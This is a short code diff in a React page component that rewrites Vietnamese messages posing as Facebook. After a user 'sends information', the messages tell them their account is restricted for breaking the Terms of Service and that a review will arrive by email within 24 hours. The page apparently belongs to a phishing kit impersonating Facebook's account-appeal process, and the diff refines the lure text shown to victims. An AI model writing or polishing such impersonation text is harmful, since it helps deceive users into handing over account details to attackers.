@@ -99,8 +99,8 @@ const Home = () => {
 
             const sendInfoTexts = {
                 title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.',
-                description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
-                description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
+                description1: 'Điều này là do tài khoản của bạn không tuân theo Điều khoản Dịch vụ của chúng tôi, vì vậy chúng tôi đã tạm thời hạn chế một số quyền truy cập của tài khoản  bạn.',
+                description2: 'Chúng tôi sẽ xem xét trường hợp của bạn và gửi thông báo đến email của bạn trong vòng 24 giờ tới.'
             };
 
             // 🎯 Dịch verify với data mặc định - ĐÃ SỬA
